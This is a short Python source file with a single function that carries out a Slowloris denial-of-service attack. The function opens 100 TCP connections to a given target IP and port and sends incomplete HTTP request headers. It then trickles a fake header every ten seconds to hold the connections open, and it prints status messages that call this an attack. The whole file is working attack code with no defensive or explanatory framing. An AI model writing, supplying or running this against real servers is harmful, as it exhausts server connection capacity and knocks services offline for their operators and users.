import socket
import threading
import time

def run_slowloris(target_ip, target_port, duration=30):
    print(f"[SLOWLORIS] Starting Slowloris attack on {target_ip}:{target_port} for {duration} seconds.")
    sockets = []

    for _ in range(100):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(b"GET /? HTTP/1.1\r\nHost: localhost\r\n")
            sockets.append(s)
        except Exception as e:
            print(f"[SLOWLORIS] Setup error: {e}")

    end_time = time.time() + duration
    while time.time() < end_time:
        for s in sockets:
            try:
                s.send(b"X-a: b\r\n")
            except Exception:
                sockets.remove(s)
        time.sleep(10)

    for s in sockets:
        s.close()

    print("[SLOWLORIS] Attack finished.")
